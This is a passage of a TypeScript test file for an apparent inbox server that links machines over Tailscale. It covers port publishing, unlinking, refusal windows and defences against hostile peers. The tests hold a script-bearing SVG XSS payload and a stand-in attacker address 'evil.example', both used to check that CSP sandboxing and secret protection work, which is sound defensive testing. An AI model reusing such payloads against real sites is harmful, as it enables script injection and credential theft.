      inbox.stop();
    }
  }, 60_000);

  test("Unlink through the other machine's real tailnet door says it was told, though that was its last link and its door comes down", async () => {
    const tsA = scriptedTailscale();
    const dataA = scratch("plannotator-machines-unlink-a-");
    const a = await startInboxServer({ dataDir: dataA, binaryPath: null, phones: false, tailscale: tsA.run });
    const b = await startInboxServer({ dataDir: scratch("plannotator-machines-unlink-b-"), binaryPath: null, phones: false, tailscale: scriptedTailscale().run });
    try {
      const session = async (port: number) => ((await (await fetch(`http://127.0.0.1:${port}/api/inbox/health`)).json()) as Json).serverSession as string;
      const post = async (port: number, path: string, body: Json) =>
        fetch(`http://127.0.0.1:${port}${path}`, { method: "POST", body: JSON.stringify({ serverSession: await session(port), ...body }) });
      // A publishes its door (the door-only listener tailscale serve points at) and offers.
      const offered = (await (await post(a.port, "/api/inbox/machines/offer", { tailscale: true })).json()) as Json;
      const doorA = tsA.serve.get(8443)!;
      expect(doorA).toMatch(/^http:\/\/127\.0\.0\.1:\d+$/);
      expect(doorA).not.toBe(`http://127.0.0.1:${a.port}`);
      // B links through A's door listener, as a tailnet peer would; A links back to B.
      const linked = await post(b.port, "/api/inbox/machines/link", { link: offered.link, address: doorA, back: `http://127.0.0.1:${b.port}` });
      expect(linked.status).toBe(201);
      expect(((await linked.json()) as Json).machine).toMatchObject({ id: offered.machine.id, both_ways: true });

      // B unlinks. A forgets its only link, so its door comes down, but only after its answer has gone out.
      const unlinked = await post(b.port, `/api/inbox/machines/${offered.machine.id}/unlink`, {});
      expect(unlinked.status).toBe(200);
      expect(((await unlinked.json()) as Json).told).toBe(true);
      expect(((await (await fetch(`http://127.0.0.1:${a.port}/api/inbox/machines`)).json()) as Json).machines).toHaveLength(1);
      await waitFor("A's door to come down", () => !tsA.serve.has(8443), 10_000);
      expect(await fetch(`${doorA}/api/inbox/device/health`).then(() => "open", () => "closed")).toBe("closed");
      expect(inboxJson(dataA).tailnet).toBeUndefined();
    } finally {
      a.stop();
      b.stop();
    }
  }, 60_000);

  test("the first publish takes 8444 when 8443 is someone else's; the code and the way back carry it; the port sticks, and when it is taken later the door refuses and says so, never moves", async () => {
    const dataDir = scratch("plannotator-machines-port-");
    const tailscale = scriptedTailscale();
    const theirs = "http://127.0.0.1:62440";
    tailscale.serve.set(8443, theirs);
    // The other machine: it pairs, answers health, and keeps the code it is handed to link back.
    const handed: string[] = [];
    const peer = Bun.serve({
      hostname: "127.0.0.1",
      port: 0,
      idleTimeout: 0,
      async fetch(req) {
        const route = new URL(req.url).pathname.replace("/api/inbox/device/", "");
        if (route === "pair") return Response.json({ token: "tok_peer", computer: { name: "Mini" } }, { status: 201 });
        if (route === "health") return Response.json({ ok: true, inbox_id: OTHER, machine_links: 1, version: "peer" });
        if (route === "link-back") {
          handed.push(String(((await req.json()) as Json).link));
          return Response.json({ machine: { id: OTHER, name: "Mini" } }, { status: 201 });
        }
        return Response.json({ code: "device_route_not_found" }, { status: 404 });
      },
    });
    const record = () => JSON.parse(readFileSync(join(dataDir, "inbox", "tailnet-door.json"), "utf8")) as Json;
    let inbox = await startInboxServer({ dataDir, binaryPath: null, phones: false, tailscale: tailscale.run });
    try {
      let base = `http://127.0.0.1:${inbox.port}`;
      const { serverSession } = (await (await fetch(`${base}/api/inbox/health`)).json()) as Json;
      const offered = (await (await fetch(`${base}/api/inbox/machines/offer`, { method: "POST", body: JSON.stringify({ serverSession, tailscale: true }) })).json()) as Json;
      expect(offered.tailnet).toBe("laptop.tail0000.ts.net:8444");
      expect(offered.link).toContain(`tailnet=${encodeURIComponent("laptop.tail0000.ts.net:8444")}`);
      const door = tailscale.serve.get(8444)!;
      expect(door).toMatch(/^http:\/\/127\.0\.0\.1:\d+$/);
      expect(door).not.toBe(`http://127.0.0.1:${inbox.port}`);
      expect(tailscale.serve.get(8443)).toBe(theirs);
      expect(tailscale.doorCalls()).toEqual([]);
      // What the Inbox made is recorded: port, target, and that the mapping may exist.
      expect(record()).toEqual({ v: 1, https_port: 8444, target: door, published: true });

      // Linking: the way back handed to the other machine carries the port.
      const linked = await fetch(`${base}/api/inbox/machines/link`, { method: "POST", body: JSON.stringify({ serverSession, link: offered.link.replace(/id=[^&]+/, `id=${OTHER}`), address: `http://127.0.0.1:${peer.port}` }) });
      expect(linked.status).toBe(201);
      expect(handed).toHaveLength(1);
      expect(handed[0]).toContain(`tailnet=${encodeURIComponent("https://laptop.tail0000.ts.net:8444")}`);

      // A clean stop takes down 8444 only; the record keeps the port.
      inbox.stop();
      expect(tailscale.serve.has(8444)).toBe(false);
      expect(tailscale.serve.get(8443)).toBe(theirs);
      expect(record()).toMatchObject({ https_port: 8444, published: false });
      // 8443 freed meanwhile: the next start still takes 8444, the address the other machine keeps.
      tailscale.serve.delete(8443);
      inbox = await startInboxServer({ dataDir, binaryPath: null, phones: false, tailscale: tailscale.run });
      expect(tailscale.serve.get(8444)).toMatch(/^http:\/\/127\.0\.0\.1:\d+$/);
      expect(tailscale.serve.has(8443)).toBe(false);
      inbox.stop();

      // Someone else takes 8444 while it is stopped: the next start refuses, leaves it, takes no other port, and says why.
      const later = "http://127.0.0.1:62441";
      tailscale.serve.set(8444, later);
      inbox = await startInboxServer({ dataDir, binaryPath: null, phones: false, tailscale: tailscale.run });
      base = `http://127.0.0.1:${inbox.port}`;
      expect([...tailscale.serve]).toEqual([[8444, later]]);
      const self = ((await (await fetch(`${base}/api/inbox/machines`)).json()) as Json).machines[0] as Json;
      expect(self).toMatchObject({ self: true, address: null });
      expect(self.reason).toContain("port 8444, where linked machines reach this Inbox");
      expect(self.reason).toContain("does not move to another port on its own");
      // A machine is linked here, so moving on purpose is unlinking it and linking again.
      expect(self.reason).toContain("unlink each machine, then link it again");
      expect(self.reason).not.toContain("tailscale serve --https=");
      // Asking for a code says the same; the code carries no address.
      const { serverSession: again } = (await (await fetch(`${base}/api/inbox/health`)).json()) as Json;
      const held = (await (await fetch(`${base}/api/inbox/machines/offer`, { method: "POST", body: JSON.stringify({ serverSession: again, tailscale: true }) })).json()) as Json;
      expect(held.tailnet).toBeNull();
      expect(held.tailnet_error).toContain("port 8444");
      expect([...tailscale.serve]).toEqual([[8444, later]]);
      expect(record()).toMatchObject({ https_port: 8444, published: false });
    } finally {
      inbox.stop();
      peer.stop(true);
    }
  }, 60_000);

  test("upgrading from a build that kept the door only in inbox.json: a mapping to exactly its door_port is the Inbox's (re-pointed, then taken down at stop and by purge); one to a different target is never touched", async () => {
    // What v0.28.40 leaves after an unclean stop: inbox.json `tailnet: { https_port: 8443, door_port }`, a live mapping, no tailnet-door.json.
    // The registry comes from a real run (its own port), with the old build's `tailnet` added, as the other door tests seed it.
    const released = async (target: (door: number) => string) => {
      const dataDir = scratch("plannotator-machines-upgrade-");
      const door = closedPort();
      (await startInboxServer({ dataDir, binaryPath: null, phones: false, tailscale: scriptedTailscale().run })).stop();
      writeFileSync(join(dataDir, "inbox", "inbox.json"), JSON.stringify({ ...inboxJson(dataDir), version: "0.28.40", tailnet: { https_port: 8443, door_port: door } }));
      const link = { id: OTHER, name: "Mini", token: "tok_x", transport: { kind: "tailnet", url: `http://127.0.0.1:${closedPort()}` }, device_id: null, linked_at: "2026-10-30T00:00:00Z" };
      writeFileSync(join(dataDir, "inbox", "machines.json"), JSON.stringify({ v: 1, self: { id: "ibx_01K00000000000000000000001" }, links: [link] }), { mode: 0o600 });
      const tailscale = scriptedTailscale();
      tailscale.serve.set(8443, target(door));
      return { dataDir, door, tailscale, record: () => JSON.parse(readFileSync(join(dataDir, "inbox", "tailnet-door.json"), "utf8")) as Json };
    };

    // The exact target the old build recorded: adopted, re-pointed at the new door listener, and taken down at a clean stop.
    const own = await released((door) => `http://127.0.0.1:${door}`);
    let inbox = await startInboxServer({ dataDir: own.dataDir, binaryPath: null, phones: false, tailscale: own.tailscale.run });
    try {
      expect(own.tailscale.doorCalls()).toEqual(["on"]);
      expect([...own.tailscale.serve.keys()]).toEqual([8443]);
      expect(own.record()).toEqual({ v: 1, https_port: 8443, target: own.tailscale.serve.get(8443), published: true });
    } finally {
      inbox.stop();
    }
    expect(own.tailscale.serve.size).toBe(0);
    expect(own.tailscale.doorCalls()).toEqual(["on", "off"]);

    // The same leftover with the Inbox stopped: uninstall --purge takes it down.
    const purged = await released((door) => `http://127.0.0.1:${door}`);
    expect(takeDownInboxTailnet(purged.dataDir, purged.tailscale.run)).toBe("removed");
    expect(purged.tailscale.serve.size).toBe(0);

    // A different target on that port: never the Inbox's. Not re-pointed, not removed, and the door refuses rather than move.
    const theirs = "http://127.0.0.1:62440";
    const other = await released(() => theirs);
    inbox = await startInboxServer({ dataDir: other.dataDir, binaryPath: null, phones: false, tailscale: other.tailscale.run });
    try {
      expect([...other.tailscale.serve]).toEqual([[8443, theirs]]);
      expect(other.record()).toMatchObject({ https_port: 8443, published: false });
      const self = ((await (await fetch(`http://127.0.0.1:${inbox.port}/api/inbox/machines`)).json()) as Json).machines[0] as Json;
      expect(self.reason).toContain("port 8443");
    } finally {
      inbox.stop();
    }
    expect([...other.tailscale.serve]).toEqual([[8443, theirs]]);
    expect(takeDownInboxTailnet(other.dataDir, other.tailscale.run)).toBe("none");
    expect([...other.tailscale.serve]).toEqual([[8443, theirs]]);
    expect(other.tailscale.doorCalls()).toEqual([]);
  }, 60_000);

  test("a far answer with a permissive CSP still carries sandbox here: the far directives are kept, sandbox is added", async () => {
    const dataDir = scratch("plannotator-machines-csp-");
    const svg = '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>';
    // A linked peer (old, buggy or hostile) that serves an SVG under `default-src *` and no sandbox.
    const peer = Bun.serve({
      hostname: "127.0.0.1",
      port: 0,
      idleTimeout: 0,
      fetch(req) {
        const route = new URL(req.url).pathname.replace("/api/inbox/device/", "");
        if (route === "health") return Response.json({ ok: true, inbox_id: OTHER, machine_links: 1, version: "peer" });
        if (route === "events") return new Response(new ReadableStream({ start: (c) => c.enqueue(new TextEncoder().encode(`event: hello\ndata: {"cursor":0}\n\n`)) }), { headers: { "Content-Type": "text/event-stream" } });
        if (route === "threads") return Response.json({ cursor: 0, sections: [], projects: [] });
        if (route === "attachments/att_x/image") return new Response(svg, { headers: { "Content-Type": "image/svg+xml", "Content-Security-Policy": "default-src *" } });
        if (route === "attachments/att_y/image") return new Response(svg, { headers: { "Content-Type": "image/svg+xml", "Content-Security-Policy": "default-src 'none'; sandbox allow-scripts" } });
        return Response.json({ code: "device_route_not_found" }, { status: 404 });
      },
    });
    const link = { id: OTHER, name: "Mini", token: "tok_x", transport: { kind: "tailnet", url: `http://127.0.0.1:${peer.port}` }, device_id: null, linked_at: "2026-10-30T00:00:00Z" };
    mkdirSync(join(dataDir, "inbox"), { recursive: true });
    writeFileSync(join(dataDir, "inbox", "machines.json"), JSON.stringify({ v: 1, self: { id: "ibx_01K00000000000000000000001" }, links: [link] }), { mode: 0o600 });
    const inbox = await startInboxServer({ dataDir, binaryPath: null, phones: false, tailscale: scriptedTailscale().run });
    try {
      const forwarded = await fetch(`http://127.0.0.1:${inbox.port}/api/inbox/m/${OTHER}/attachments/att_x/image`);
      expect(forwarded.status).toBe(200);
      expect(await forwarded.text()).toBe(svg);
      expect(forwarded.headers.get("content-security-policy")).toBe("default-src *; sandbox");
      // A far CSP that already sandboxes is kept as it is.
      const kept = await fetch(`http://127.0.0.1:${inbox.port}/api/inbox/m/${OTHER}/attachments/att_y/image`);
      expect(kept.headers.get("content-security-policy")).toBe("default-src 'none'; sandbox allow-scripts");
      await kept.arrayBuffer();
    } finally {
      inbox.stop();
      peer.stop(true);
    }
  }, 60_000);

  test("a peer can never take this Inbox's ids: its rows naming them are dropped, and no route to them is forwarded (active, archived, pinned)", async () => {
    const dataDir = scratch("plannotator-machines-own-ids-");
    // This Inbox's own threads: one active, one archived, one pinned.
    const store = InboxStore.open(dataDir);
    const project = store.ensureProject({ name: "billing-svc", root: "/work/billing-svc" });
    // One session each, so each is its own thread.
    const agent = (session: string) => ({ kind: "agent" as const, host: "claude-code", session, name: null });
    const active = store.sendMessage({ project_id: project.id, author: agent("ses_active"), body: "Active" }).message.id;
    const archived = store.sendMessage({ project_id: project.id, author: agent("ses_archived"), body: "Archived" }).message.id;
    const pinned = store.sendMessage({ project_id: project.id, author: agent("ses_pinned"), body: "Pinned" }).message.id;
    store.resolveThread(archived, true);
    store.setPinned(pinned, true);
    const own = [active, archived, pinned];
    // A peer that lists rows with those ids (and one of its own), and records every other request that reaches it.
    const reached: string[] = [];
    const row = (id: string) => ({ thread_id: id, subject: "Mine now", section: "waiting", project: { id: project.id, name: "billing-svc" } });
    const peer = Bun.serve({
      hostname: "127.0.0.1",
      port: 0,
      idleTimeout: 0,
      fetch(req) {
        const route = new URL(req.url).pathname.replace("/api/inbox/device/", "");
        if (route === "health") return Response.json({ ok: true, inbox_id: OTHER, machine_links: 1, version: "peer" });
        if (route === "events") return new Response(new ReadableStream({ start: (c) => c.enqueue(new TextEncoder().encode(`event: hello\ndata: {"cursor":0}\n\n`)) }), { headers: { "Content-Type": "text/event-stream" } });
        if (route === "threads") return Response.json({ cursor: 1, sections: [{ id: "waiting", threads: [...own.map(row), row("msg_01KPEEROWN0000000000000001")] }], projects: [{ id: project.id, name: "billing-svc" }] });
        reached.push(`${req.method} ${route}`);
        return Response.json({ ok: true });
      },
    });
    const link = { id: OTHER, name: "Mini", token: "tok_x", transport: { kind: "tailnet", url: `http://127.0.0.1:${peer.port}` }, device_id: null, linked_at: "2026-10-30T00:00:00Z" };
    mkdirSync(join(dataDir, "inbox"), { recursive: true });
    writeFileSync(join(dataDir, "inbox", "machines.json"), JSON.stringify({ v: 1, self: { id: "ibx_01K00000000000000000000001" }, links: [link] }), { mode: 0o600 });
    const inbox = await startInboxServer({ dataDir, binaryPath: null, phones: false, tailscale: scriptedTailscale().run });
    const base = `http://127.0.0.1:${inbox.port}`;
    try {
      const merged = await waitFor("the peer's list in the merged list", async () => {
        const model = (await (await fetch(`${base}/api/inbox/threads?machines=1&archived=include`)).json()) as Json;
        const rows = (model.sections as Json[]).flatMap((s) => s.threads as Json[]);
        return rows.some((r) => r.machine === OTHER) ? rows : null;
      });
      // The peer's own row is merged; none of its rows with this Inbox's ids is, and this Inbox's project stays its own.
      for (const id of own) expect(merged.filter((r) => r.thread_id === id).every((r) => r.machine !== OTHER)).toBe(true);
      const { serverSession } = (await (await fetch(`${base}/api/inbox/health`)).json()) as Json;
      for (const id of own) {
        for (const [method, route, body] of [
          ["GET", `threads/${id}`, null],
          ["POST", `messages/${id}/reply`, { words: "x", seen_through_seq: 1, idempotency_key: `k-${id}` }],
          ["POST", `messages/${id}/picks`, { picks: [], idempotency_key: `p-${id}` }],
          ["POST", `messages/${id}/send-now`, { idempotency_key: `s-${id}` }],
          ["POST", `threads/${id}/read`, { idempotency_key: `r-${id}` }],
          ["POST", `messages/${id}/resolve`, { resolved: true, idempotency_key: `a-${id}` }],
        ] as const) {
          const answer = await fetch(`${base}/api/inbox/m/${OTHER}/${route}`, {
            method,
            headers: { "Content-Type": "application/json", Origin: base },
            ...(body ? { body: JSON.stringify({ serverSession, ...body }) } : {}),
          });
          expect(answer.status).toBe(409);
          expect(((await answer.json()) as Json).code).toBe("id_is_local");
        }
      }
      // A write naming a local message in its body (an annotation) is refused the same way.
      const annotation = await fetch(`${base}/api/inbox/m/${OTHER}/annotations`, {
        method: "POST",
        headers: { "Content-Type": "application/json", Origin: base },
        body: JSON.stringify({ serverSession, message_id: active, idempotency_key: "n-1" }),
      });
      expect(annotation.status).toBe(409);
      // And a new message into this Inbox's project, and a project route.
      const message = await fetch(`${base}/api/inbox/m/${OTHER}/messages`, {
        method: "POST",
        headers: { "Content-Type": "application/json", Origin: base },
        body: JSON.stringify({ serverSession, project_id: project.id, body: "x", idempotency_key: "m-1" }),
      });
      expect(message.status).toBe(409);
      expect(((await message.json()) as Json).id).toBe(project.id);
      const projectRead = await fetch(`${base}/api/inbox/m/${OTHER}/projects/${project.id}/read`, {
        method: "POST",
        headers: { "Content-Type": "application/json", Origin: base },
        body: JSON.stringify({ serverSession, batch_id: "b1", idempotency_key: "pr-1" }),
      });
      expect(projectRead.status).toBe(409);
      expect(reached).toEqual([]);
      expect(existsSync(join(dataDir, "inbox", "outbox", `${OTHER}.jsonl`))).toBe(false);
    } finally {
      inbox.stop();
      peer.stop(true);
    }
  }, 60_000);

  test("with Phones on, a machine never pairs (by code or secret) or connects over the Wi-Fi listener: the tailnet only", async () => {
    const devices = createInboxDevices({
      dataDir: scratch("plannotator-machines-wifi-"),
      serverSession: "0".repeat(32),
      port: () => 1,
      registry: () => ({ v: 1, pid: process.pid, port: 1, url: "", version: "dev", token: "t".repeat(64), serverSession: "0".repeat(32), startedAt: "" }),
      readBody: async (req) => (await req.json()) as Record<string, unknown>,
      dispatch: async () => Response.json({ ok: true }),
      phones: true,
    });
    const offer = devices.machineDoor.openMachineOffer();
    const pairUrl = new URL("http://127.0.0.1/api/inbox/device/pair");
    const pair = (body: Json, via: "wifi" | "tailnet") => devices.door(new Request(pairUrl, { method: "POST", body: JSON.stringify({ name: "Mini", platform: "machine", ...body }) }), pairUrl, via);
    for (const body of [{ code: offer.code }, { secret: offer.secret }]) {
      const refused = (await pair(body, "wifi"))!;
      expect(refused.status).toBe(403);
      expect(((await refused.json()) as Json).code).toBe("machine_not_accepted_here");
    }
    const paired = (await pair({ secret: offer.secret }, "tailnet"))!;
    expect(paired.status).toBe(201);
    const { token } = (await paired.json()) as Json;
    const healthUrl = new URL("http://127.0.0.1/api/inbox/device/health");
    const asked = (via: "wifi" | "tailnet") => devices.door(new Request(healthUrl, { headers: { Authorization: `Bearer ${token}` } }), healthUrl, via);
    expect((await asked("wifi"))!.status).toBe(403);
    expect((await asked("tailnet"))!.status).toBe(200);
  });

  test("link <code> publishes this side's door itself, and takes it down again when the link fails", async () => {
    const dataDir = scratch("plannotator-machines-link-door-");
    const tailscale = scriptedTailscale();
    const inbox = await startInboxServer({ dataDir, binaryPath: null, phones: false, tailscale: tailscale.run });
    try {
      const base = `http://127.0.0.1:${inbox.port}`;
      const { serverSession } = (await (await fetch(`${base}/api/inbox/health`)).json()) as Json;
      const code = `plannotator://link?v=1&id=${OTHER}&name=Mini&secret=s3cr3t&code=123456`;
      const linked = await fetch(`${base}/api/inbox/machines/link`, { method: "POST", body: JSON.stringify({ serverSession, link: code, address: `http://127.0.0.1:${closedPort()}` }) });
      expect(((await linked.json()) as Json).code).toBe("machine_unreachable");
      expect(linked.status).toBe(502);
      // Published for the way back before the other machine was asked, then down again: nothing came of it.
      expect(tailscale.doorCalls()).toEqual(["on", "off"]);
      expect(inboxJson(dataDir).tailnet).toBeUndefined();
      // An address off the tailnet is never asked at all: no secret leaves for it.
      const elsewhere = await fetch(`${base}/api/inbox/machines/link`, { method: "POST", body: JSON.stringify({ serverSession, link: code, address: "https://evil.example:8443" }) });
      expect(elsewhere.status).toBe(422);
      expect(tailscale.doorCalls()).toEqual(["on", "off"]);
    } finally {
      inbox.stop();
    }
  }, 60_000);

  // ── Unlink with the other machine away, Phones off, its last link (two-mac-test-2, Bug A) ──

  const sessionOf = async (port: number) => ((await (await fetch(`http://127.0.0.1:${port}/api/inbox/health`)).json()) as Json).serverSession as string;
  const postTo = async (port: number, path: string, body: Json) =>
    fetch(`http://127.0.0.1:${port}${path}`, { method: "POST", body: JSON.stringify({ serverSession: await sessionOf(port), ...body }) });
  const linksIn = (dataDir: string) => (JSON.parse(readFileSync(join(dataDir, "inbox", "machines.json"), "utf8")) as Json).links as Json[];
  /** A device as the door keeps it now: the last line for its id in devices.jsonl. */
  const deviceIn = (dataDir: string, id: string) =>
    readFileSync(join(dataDir, "inbox", "devices.jsonl"), "utf8")
      .split("\n")
      .filter(Boolean)
      .map((line) => JSON.parse(line) as Json)
      .filter((line) => line.id === id)
      .at(-1)!.record as Json;

  /** A (its door published on 8443) and B, linked both ways with Phones off: B through A's door listener, as a tailnet peer would. */
  const linkedPair = async (prefix: string, aOptions: { unlinkedRefusalKeptMs?: number } = {}) => {
    const tsA = scriptedTailscale();
    const dataA = scratch(`plannotator-machines-${prefix}-a-`);
    const dataB = scratch(`plannotator-machines-${prefix}-b-`);
    const startA = (extra: { now?: () => Date } = {}) => startInboxServer({ dataDir: dataA, binaryPath: null, phones: false, tailscale: tsA.run, ...aOptions, ...extra });
    const startB = () => startInboxServer({ dataDir: dataB, binaryPath: null, phones: false, tailscale: scriptedTailscale().run });
    const a = await startA();
    const b = await startB();
    const offered = (await (await postTo(a.port, "/api/inbox/machines/offer", { tailscale: true })).json()) as Json;
    const doorA = tsA.serve.get(8443)!;
    const linked = await postTo(b.port, "/api/inbox/machines/link", { link: offered.link, address: doorA, back: `http://127.0.0.1:${b.port}` });
    expect(linked.status).toBe(201);
    const bId = linksIn(dataA)[0]!.id as string;
    // Both lines settled (no first dial still in flight), so "asleep" below means no request of B's reaches A.
    const online = async (port: number) =>
      (((await (await fetch(`http://127.0.0.1:${port}/api/inbox/machines`)).json()) as Json).machines as Json[]).every((m) => m.self || m.state === "online");
    await waitFor("A and B online to each other", async () => (await online(a.port)) && (await online(b.port)), 10_000);
    return { tsA, dataA, dataB, a, b, startA, startB, doorA, bId, tokenBA: linksIn(dataB)[0]!.token as string, deviceOfB: linksIn(dataA)[0]!.device_id as string };
  };

  test("an Unlink that could not reach the other machine keeps this door up, through a restart, until that machine is refused; then it comes down. Meanwhile the door serves nothing new", async () => {
    const pair = await linkedPair("owed");
    let { a, b } = pair;
    try {
      // B is asleep. A unlinks it: its last link, and B cannot be told.
      b.stop();
      const unlinked = await postTo(a.port, `/api/inbox/machines/${pair.bId}/unlink`, {});
      expect(unlinked.status).toBe(200);
      expect(((await unlinked.json()) as Json).told).toBe(false);
      expect(linksIn(pair.dataA)).toHaveLength(0);
      // The door stays published (B's next contact needs it), the switch stays on, and what is owed is on disk.
      expect(pair.tsA.doorCalls()).toEqual(["on"]);
      expect(pair.tsA.serve.get(8443)).toBe(pair.doorA);
      expect(inboxJson(pair.dataA).tailnet).toMatchObject({ https_port: 8443 });
      const owed = deviceIn(pair.dataA, pair.deviceOfB);
      expect(owed.revoked_at).toBeString();
      expect(Date.parse(owed.refusal_owed_until) - Date.now()).toBeGreaterThan(UNLINKED_REFUSAL_KEPT_MS - 60_000);

      // Nothing new is served while it is kept: no token, pairing with no offer open and any non-door route are the unknown
      // route; a token it does not know is told so, as while a machine is linked. B's own token is revoked (checked below).
      expect((await fetch(`${pair.doorA}/api/inbox/device/health`)).status).toBe(404);
      expect((await fetch(`${pair.doorA}/api/inbox/device/threads`)).status).toBe(404);
      expect((await fetch(`${pair.doorA}/api/inbox/threads`, { headers: { Authorization: `Bearer ${pair.tokenBA}` } })).status).toBe(404);
      expect((await fetch(`${pair.doorA}/api/inbox/health`)).status).toBe(404);
      const pairing = await fetch(`${pair.doorA}/api/inbox/device/pair`, { method: "POST", body: JSON.stringify({ code: "123456", name: "Evil", platform: "machine" }) });
      expect(pairing.status).toBe(404);
      const stranger = await fetch(`${pair.doorA}/api/inbox/device/threads`, { headers: { Authorization: "Bearer tok_nobody_issued" } });
      expect(stranger.status).toBe(401);
      expect(((await stranger.json()) as Json).code).toBe("device_token_invalid");
      expect(pair.tsA.serve.get(8443)).toBe(pair.doorA);

      // A restarts in between: the stop takes the door down, and the start publishes it again for B alone.
      a.stop();
      expect(pair.tsA.serve.has(8443)).toBe(false);
      a = await pair.startA();
      expect(pair.tsA.doorCalls()).toEqual(["on", "off", "on"]);
      expect(pair.tsA.serve.get(8443)).toBe(pair.doorA);

      // B wakes: its next contact gets device_revoked, it removes its side, and A's door comes down after that answer.
      b = await pair.startB();
      await waitFor("B forgot A at its next contact", () => linksIn(pair.dataB).length === 0, 30_000);
      await waitFor("A's door to come down", () => !pair.tsA.serve.has(8443), 10_000);
      expect(pair.tsA.doorCalls()).toEqual(["on", "off", "on", "off"]);
      expect(inboxJson(pair.dataA).tailnet).toBeUndefined();
      expect(deviceIn(pair.dataA, pair.deviceOfB).refusal_owed_until).toBeUndefined();
      expect(await fetch(`${pair.doorA}/api/inbox/device/health`).then(() => "open", () => "closed")).toBe("closed");
      // Settled: the next start runs no tailscale at all.
      a.stop();
      const calls = pair.tsA.calls.length;
      a = await pair.startA();
      expect(pair.tsA.calls.length).toBe(calls);
    } finally {
      a.stop();
      b.stop();
    }
  }, 90_000);

  test("the door kept for an unlinked machine that never comes back comes down at the time limit, running or across a restart", async () => {
    // Running: the limit passes while A is up (a short one here; a week by default).
    const quick = await linkedPair("limit", { unlinkedRefusalKeptMs: 1_500 });
    try {
      quick.b.stop();
      expect(((await (await postTo(quick.a.port, `/api/inbox/machines/${quick.bId}/unlink`, {})).json()) as Json).told).toBe(false);
      expect(quick.tsA.serve.get(8443)).toBe(quick.doorA);
      await waitFor("A's door to come down at the limit", () => !quick.tsA.serve.has(8443), 10_000);
      expect(quick.tsA.doorCalls()).toEqual(["on", "off"]);
      expect(inboxJson(quick.dataA).tailnet).toBeUndefined();
    } finally {
      quick.a.stop();
      quick.b.stop();
    }

    // Stopped: A is down when the limit passes, with the switch still on and the refusal still recorded.
    const away = await linkedPair("limit-restart");
    let a = away.a;
    try {
      away.b.stop();
      expect(((await (await postTo(a.port, `/api/inbox/machines/${away.bId}/unlink`, {})).json()) as Json).told).toBe(false);
      a.stop();
      expect(inboxJson(away.dataA).tailnet).toMatchObject({ https_port: 8443 });
      const calls = away.tsA.calls.length;
      // Started past the limit: nothing is owed any more, nothing is linked, so tailscale never runs.
      a = await away.startA({ now: () => new Date(Date.now() + UNLINKED_REFUSAL_KEPT_MS + 60_000) });
      expect(away.tsA.calls.length).toBe(calls);
      expect(away.tsA.serve.has(8443)).toBe(false);
      a.stop();
      // Within the limit it would have been published: the limit is what decided.
      a = await away.startA();
      expect(away.tsA.serve.get(8443)).toMatch(/^http:\/\/127\.0\.0\.1:\d+$/);
    } finally {
      a.stop();
      away.b.stop();
    }
  }, 90_000);

  test("a door a crash left published for an unlinked machine comes down at the first start past the limit, and only that runs", async () => {
    const pair = await linkedPair("crash");
    let a = pair.a;
    try {
      pair.b.stop();
      expect(((await (await postTo(a.port, `/api/inbox/machines/${pair.bId}/unlink`, {})).json()) as Json).told).toBe(false);
      // A is killed (kill -9, a dead battery) while the door is kept: no clean stop, so the mapping and its record stay.
      const left = readTailnetDoorRecord(pair.dataA)!;
      expect(left).toMatchObject({ https_port: 8443, target: pair.doorA, published: true });
      a.stop();
      writeTailnetDoorRecord(pair.dataA, left);
      pair.tsA.serve.set(8443, pair.doorA);
      const calls = pair.tsA.calls.length;
      // Started past the limit: nothing is linked or owed, so only the take-down of that leftover runs.
      a = await pair.startA({ now: () => new Date(Date.now() + UNLINKED_REFUSAL_KEPT_MS + 60_000) });
      expect(pair.tsA.calls.slice(calls)).toEqual([
        ["serve", "status", "--json"],
        ["serve", "--https=8443", "off"],
      ]);
      expect(pair.tsA.serve.has(8443)).toBe(false);
      expect(inboxJson(pair.dataA).tailnet).toBeUndefined();
      expect(readTailnetDoorRecord(pair.dataA)).toBeNull();
      expect(deviceIn(pair.dataA, pair.deviceOfB).refusal_owed_until).toBeUndefined();
      // Settled: the next start runs no tailscale at all.
      a.stop();
      const settled = pair.tsA.calls.length;
      a = await pair.startA();
      expect(pair.tsA.calls.length).toBe(settled);
    } finally {
      a.stop();
      pair.b.stop();
    }
  }, 90_000);

  test("a held port with nothing linked says how it is let go of (there is no machine to unlink), and it is: the next code takes a free port", async () => {
    // An older build's door in inbox.json, its port now someone else's, and nothing linked (two-mac-test-2, Nit B).
    const dataDir = scratch("plannotator-machines-held-unlinked-");
    (await startInboxServer({ dataDir, binaryPath: null, phones: false, tailscale: scriptedTailscale().run })).stop();
    writeFileSync(join(dataDir, "inbox", "inbox.json"), JSON.stringify({ ...inboxJson(dataDir), version: "0.28.40", tailnet: { https_port: 8443, door_port: closedPort() } }));
    const tailscale = scriptedTailscale();
    const theirs = "http://127.0.0.1:62440";
    tailscale.serve.set(8443, theirs);
    const inbox = await startInboxServer({ dataDir, binaryPath: null, phones: false, tailscale: tailscale.run });
    try {
      expect(tailscale.calls).toEqual([]);
      const code = `plannotator://link?v=1&id=${OTHER}&name=Mini&secret=s3cr3t&code=123456`;
      // Linking from here needs a way back; the kept port is held, so the link is refused, in words that fit nothing linked.
      const linked = await postTo(inbox.port, "/api/inbox/machines/link", { link: code, address: `http://127.0.0.1:${closedPort()}` });
      expect(linked.status).toBe(409);
      const refused = (await linked.json()) as Json;
      expect(refused.code).toBe("no_way_back");
      expect(refused.error).toContain("port 8443");
      expect(refused.error).toContain("Nothing is linked here");
      expect(refused.error).not.toContain("unlink each machine");
      expect([...tailscale.serve]).toEqual([[8443, theirs]]);
      // No code is open and nothing is linked, so the port was let go of: the next code takes a free one, theirs untouched.
      expect(inboxJson(dataDir).tailnet).toBeUndefined();
      const offered = (await (await postTo(inbox.port, "/api/inbox/machines/offer", { tailscale: true })).json()) as Json;
      expect(offered.tailnet).toBe("laptop.tail0000.ts.net:8444");
      expect(tailscale.serve.get(8443)).toBe(theirs);
    } finally {
      inbox.stop();
    }
  }, 60_000);
});

describe("an agent's snooze_thread of a linked machine's thread", () => {
  const dirs: string[] = [];
  const sandboxWas = process.env.PLANNOTATOR_TEST_SANDBOX;
  beforeAll(() => {
    process.env.PLANNOTATOR_TEST_SANDBOX = "1";
  });
  afterAll(() => {
    if (sandboxWas === undefined) delete process.env.PLANNOTATOR_TEST_SANDBOX;
    else process.env.PLANNOTATOR_TEST_SANDBOX = sandboxWas;
    for (const dir of dirs) rmSync(dir, { recursive: true, force: true });
  });
  const scratch = (prefix: string) => {
    const dir = realpathSync(mkdtempSync(join(tmpdir(), prefix)));
